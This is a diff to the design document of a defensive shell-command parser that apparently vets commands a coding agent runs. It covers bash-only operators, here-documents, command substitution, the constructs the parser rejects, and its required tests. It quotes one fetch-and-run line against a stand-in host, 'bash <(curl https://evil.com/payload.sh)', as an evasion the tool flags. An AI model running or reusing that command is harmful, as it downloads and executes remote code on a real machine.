@@ -38,13 +38,29 @@ Plus `NEWLINE`, which is a token and not an operator, and `EOF`.
 
 The lexer must recognize every operator above even where the parser will reject it, so that an unsupported construct produces a precise diagnostic rather than a confusing one. `;;` only ever appears in `case`, which we do not accept, but reporting "case terminator outside a case statement" is far better than mis-tokenizing.
 
+### 2.1b The bash-only operators
+
+These are not in POSIX, and a POSIX-only lexer reads each of them as two or more separate tokens. That difference is not academic: it is a bypass, because our analysis would see one thing and the shell would do another. Each therefore gets its own token, which the parser then rejects by name.
+
+| Token | Symbol | What a POSIX lexer sees | What bash does |
+|---|---|---|---|
+| `AND_GREAT` | `&>` | `&` then `>` — background, then truncate | redirect **both** streams to the file |
+| `AND_DGREAT` | `&>>` | `&` then `>>` | both streams, appending |
+| `PIPE_AND` | `\|&` | `\|` then `&` — pipe, then background | pipe **both** streams |
+| `TRIPLE_LESS` | `<<<` | `<<` then `<` | here-string |
+| `DSEMI_AND` | `;;&` | `;;` then `&` | `case` fall-through |
+
+The first row is verified, not assumed: on bash 5.3.15, `ls /nonexistent &>cap.txt` puts the error message *inside* `cap.txt`, where the POSIX reading would background the command and leave the file empty. `tests/test_lexer.py::test_and_great_is_not_two_tokens` asserts we never emit `AMP` for it.
+
+Two further bash divergences live in the word rules rather than the operators, and both are verified. A tilde expands after an unquoted `=`, so `echo a=~` prints `a=` followed by the home directory. And inside `$'...'`, an escape bash does not recognise keeps its backslash, so `$'\8'` is the two characters `\8` and not `8`.
+
 ### 2.2 Word tokens
 
 POSIX classifies every delimited non-operator token as a generic `TOKEN` and then reclassifies it by context. The classification, from 2.10.1, applies in order:
 
 1. If it is an operator, return that operator's token.
 2. If the string is all digits and the delimiter is `<` or `>`, return `IO_NUMBER`.
-3. If it is at least three characters, starts with `{`, ends with `}` and the delimiter is `<` or `>`, it may be `IO_LOCATION`. **We do not support this**; we return `TOKEN` and the parser rejects the redirection form.
+3. If it is at least three characters, starts with `{`, ends with `}` and the delimiter is `<` or `>`, it may be `IO_LOCATION`. **We do not support this**; the lexer refuses it by name (`io-location-redirect`), since POSIX marks the form implementation-defined and an unspecified case is a rejection for us.
 4. Otherwise return `TOKEN`.
 
 Context then turns a `TOKEN` into one of:
@@ -126,15 +142,25 @@ cmd_prefix        : io_redirect | cmd_prefix io_redirect
                   | ASSIGNMENT_WORD | cmd_prefix ASSIGNMENT_WORD
 cmd_suffix        : io_redirect | cmd_suffix io_redirect | WORD | cmd_suffix WORD
 redirect_list     : io_redirect | redirect_list io_redirect
-io_redirect       : io_file | IO_NUMBER io_file
+io_redirect       : io_file | IO_NUMBER io_file | io_here | IO_NUMBER io_here
 io_file           : LT filename | LESSAND filename | GT filename | GREATAND filename
                   | DGREAT filename | LESSGREAT filename | CLOBBER filename
 filename          : WORD
+io_here           : DLESS here_end | DLESSDASH here_end
+here_end          : WORD                                 -- quoted delimiter only
 newline_list      : NEWLINE | newline_list NEWLINE
 linebreak         : newline_list | empty
 separator_op      : AMP | SEMI
 separator         : separator_op linebreak | newline_list
 ```
+
+**Command substitution is not in the production list above, and that is deliberate.** `$(...)` is not a token of its own: POSIX performs no substitution during token recognition, so the construct stays inside the word token with its characters unmodified, and `echo $(date)` is one `WORD`. But the text inside it is a shell program, and the standard requires the tokenizing rules to be reapplied recursively to find the matching `)` and embedded expansions to be processed recursively. So the recursion is in the word, not in the grammar:
+
+```
+CMD_SUBST part  ::  "$(" program ")"        -- a nested `program`, parsed by the same parser
+```
+
+The parser therefore calls itself on the captured inner text and stores the resulting node on the part. `MAX_NESTING_DEPTH` bounds the recursion, and a substitution whose inside does not parse makes the whole command a denial, exactly as at the top level. Backquoted substitution is refused outright by the lexer (`BACKQUOTE_SUBSTITUTION`), which removes the POSIX rationale's non-conforming end-of-word case along with it.
 
 That is the whole accepted language: words with their quoting, assignments, simple commands, pipelines, `&&`/`||` lists, `;` and `&` separators, `!` negation, file redirections with optional file descriptors, and subshells. It covers, in our estimation, the large majority of what a coding agent actually runs, and it is small enough that two people can write a correct recursive-descent parser for it and test it exhaustively.
 
@@ -146,7 +172,9 @@ Rejection is a verdict, not a failure. Each of these produces a named diagnostic
 
 **Function definitions**: `fname() compound_command`. A definition changes what a name means for every later command, which is session state we would have to model as a mini-interpreter.
 
-**Here-documents**: `<<` and `<<-`, and therefore the `io_here` and `here_end` productions. They need the lexer to read a body that begins after the next `NEWLINE`, per POSIX 2.7.4, and that body is attacker-controlled text of arbitrary length. Note that we still *tokenize* `DLESS` and `DLESSDASH`, so the diagnostic is precise.
+**Here-documents with an unquoted delimiter**: `cat <<EOF`. The body of one of these undergoes expansion, so its content is not determined by the source and we would be guessing at it. Named refusal: `heredoc-unquoted-delimiter`.
+
+The **quoted** form, `cat <<'EOF'`, is accepted, and the earlier version of this document was wrong to reject both. The reason given then was that the body is attacker-controlled text of arbitrary length — but so is a single-quoted string, which we accept without difficulty. A quoted delimiter makes the body a pure literal, agents use the form constantly to write files and commit messages, and rejecting it would have cost us a large slice of ordinary commands for no security benefit. The lexer reads the body starting after the next `NEWLINE` per POSIX 2.7.4, strips leading tabs for `<<-`, and attaches it to the `DLESS` token as a `HEREDOC_BODY` part whose value is known.
 
 **Process substitution**: `<(...)` and `>(...)`. These are a shell spawning a shell, with the inner command's output appearing as a filename. bashguard flags `bash <(curl https://evil.com/payload.sh)` as an evasion rule, and there is no benign use we need.
 
@@ -174,6 +202,8 @@ One context-dependence to watch: `IO_NUMBER` depends on the *delimiter* that fol
 
 The parser is not done until these hold, and each should be a named test:
 
+- `ParseError` is the only exception that escapes `parse`, for any token list the lexer can produce — the parser's counterpart to the lexer's fail-closed property test, and the thing the gate's two failure paths rest on. See `docs/decisions.md` for why the parser raises rather than collecting diagnostics.
+- A command substitution whose inside does not parse is a denial of the whole command, with the inner diagnostic, not a word marked unresolved.
 - Each of the ten token-recognition rules, asserted individually by rule number.
 - Every operator token, including those the parser rejects.
 - Quoting: `grep '2>&1' file` has three words and no redirection; `echo "a b"` has two words; `echo a\ b` has two words; `$'\x41'` resolves to `A`.
@@ -183,4 +213,9 @@ The parser is not done until these hold, and each should be a named test:
 - Nesting depth of `CMD_SUBST` is recorded, and `$(echo $(whoami))` reports depth two.
 - Escaped newline does not split a command.
 - Every rejected construct produces its own diagnostic, naming the construct.
+- Each bash-only operator in section 2.1b produces its own token, and `&>` never becomes `AMP`.
+- Here-documents: a quoted delimiter captures the body literally; `<<-` strips leading tabs; an unquoted delimiter and an unterminated body are each a named refusal.
 - A differential test against `bash -n`: for a corpus of commands, if `bash -n` accepts and we reject, that is expected and the construct must be in the rejected list above; if `bash -n` rejects and we accept, that is a bug. `bash -n` only checks syntax and runs nothing, which keeps the "never execute what we analyse" rule intact. Using `tree-sitter-bash` as a second oracle is also fair, in tests only.
+- An argv oracle, which is the test that actually matters, and which needs the narrow exception recorded in `AGENTS.md`: for generated literal words, compare our value against the argument bash really passes, obtained with `printf '%s\0'`. A first run of twelve words agreed on eleven and found one genuine lexer bug, the `$'\8'` case above. The twelfth was the tilde, which the lexer is not supposed to resolve.
+
+Status: the lexer satisfies these; the parser does not exist yet. On Windows, pass the script to bash over **stdin** rather than as an argument to `-c`: `subprocess` rebuilds an argv list into a command line using the MS C runtime quoting rules, which rewrite backslashes and corrupt exactly the inputs an argv oracle exists to test. That cost us one false disagreement before we spotted it.
